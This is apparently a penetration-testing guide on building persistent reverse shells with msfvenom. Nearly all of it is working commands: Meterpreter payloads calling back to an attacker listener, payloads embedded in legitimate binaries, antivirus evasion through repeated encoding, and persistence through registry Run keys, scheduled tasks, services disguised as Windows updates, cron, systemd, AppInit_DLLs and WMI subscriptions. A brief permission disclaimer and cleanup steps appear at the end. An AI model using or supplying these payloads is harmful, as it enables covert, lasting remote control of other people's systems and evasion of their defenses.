# Creating Persistent Reverse Shells with MSFVenom

This guide covers various methods to create reverse shell payloads with persistence using `msfvenom`.

## Table of Contents
- [Basic Persistent Payload](#basic-persistent-payload)
- [Windows Persistence Methods](#windows-persistence-methods)
- [Linux Persistence Methods](#linux-persistence-methods)
- [Multi-Handler Setup](#multi-handler-setup)
- [Advanced Persistence Techniques](#advanced-persistence-techniques)
- [Considerations and Best Practices](#considerations-and-best-practices)

---

## Basic Persistent Payload

### Method 1: Built-in Persistence Flag
```bash
# Windows executable with thread persistence
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f exe \
  -o persistent_shell.exe \
  -k  # Keeps original executable functional

# Alternative with encoding for evasion
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f exe \
  -e x86/shikata_ga_nai \
  -i 3 \
  -k \
  -o stealth_persistent.exe
```

### Method 2: Embedded in Legitimate Binary
```bash
# Embed payload in legitimate Windows binary
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f exe \
  -x /path/to/legitimate.exe \
  -k \
  -o trusted_app.exe
```

---

## Windows Persistence Methods

### Registry-Based Persistence
```bash
# Create PowerShell payload
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f psh \
  -o shell.ps1
```

**Add this persistence code to your payload:**
```powershell
# Registry Run Key persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$payloadPath = "$env:APPDATA\persistent.exe"
Copy-Item $MyInvocation.MyCommand.Path $payloadPath
Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value $payloadPath

# Scheduled Task persistence
$action = New-ScheduledTaskAction -Execute $payloadPath
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -Force
```

### Service-Based Persistence
```bash
# Create service-compatible payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f exe \
  -o service_shell.exe
```

**Service installation commands:**
```cmd
sc create "WindowsUpdateService" binPath= "C:\Path\To\service_shell.exe" start= auto
sc start "WindowsUpdateService"
```

---

## Linux Persistence Methods

### Cron Job Persistence
```bash
# Create Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f elf \
  -o shell.elf
```

**Add to crontab:**
```bash
# Add to user's crontab
(crontab -l; echo "@reboot /tmp/shell.elf") | crontab -

# Or system-wide
echo "@reboot /tmp/shell.elf" >> /etc/crontab
```

### Systemd Service Persistence
```bash
# Create systemd service file
echo "[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/shell.elf
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/system-maintenance.service

# Enable and start service
systemctl enable system-maintenance.service
systemctl start system-maintenance.service
```

---

## Multi-Handler Setup

### Basic Listener
```bash
msfconsole -q -x "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
set ExitOnSession false
exploit -j
"
```

### Persistent Handler with Auto-Run Scripts
```bash
# Create resource file (listener.rc)
echo "use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
set AutoRunScript persistence -U -i 60 -p 443 -r 192.168.1.100
exploit -j" > listener.rc

# Run with resource file
msfconsole -r listener.rc
```

---

## Advanced Persistence Techniques

### Domain-Based Persistence
```bash
# Create DLL payload for AppInit_DLLs persistence
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f dll \
  -o persistent.dll
```

**Registry modification:**
```reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows]
"AppInit_DLLs"="C:\\Path\\To\\persistent.dll"
"LoadAppInit_DLLs"=dword:00000001
```

### WMI Event Subscription
```powershell
# WMI persistence (requires admin privileges)
$filterArgs = @{
    Name = 'SystemUpdateFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
}

$consumerArgs = @{
    Name = 'SystemUpdateConsumer'
    CommandLineTemplate = "C:\Path\To\persistent.exe"
}

$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter;Consumer=$consumer}
```

---

## Considerations and Best Practices

### Anti-Virus Evasion
```bash
# Use multiple encoders and iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe \
  -k \
  -x /path/to/legitimate.exe \
  -o highly_evasive.exe
```

### Stealth Techniques
- **Use common port numbers** (443, 80, 53)
- **Implement sleep/jitter** between callbacks
- **Use HTTPS payloads** instead of raw TCP
- **Implement domain fronting** where possible

### Legal and Ethical Considerations
- ⚠️ **Only use on systems you own or have explicit permission to test**
- 📝 **Maintain proper documentation and authorization**
- 🔒 **Secure your listener infrastructure**
- 🗑️ **Remove persistence mechanisms after testing**

### Cleanup Commands
```bash
# Windows cleanup
sc delete "WindowsUpdateService"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"

# Linux cleanup
crontab -l | grep -v "@reboot /tmp/shell.elf" | crontab -
systemctl disable system-maintenance.service
rm /etc/systemd/system/system-maintenance.service
```

---

## References

- [MSFVenom Official Documentation](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
- [Metasploit Persistence Module](https://www.rapid7.com/db/modules/post/windows/manage/persistence_exe/)
- [MITRE ATT&CK Persistence Techniques](https://attack.mitre.org/tactics/TA0003/)
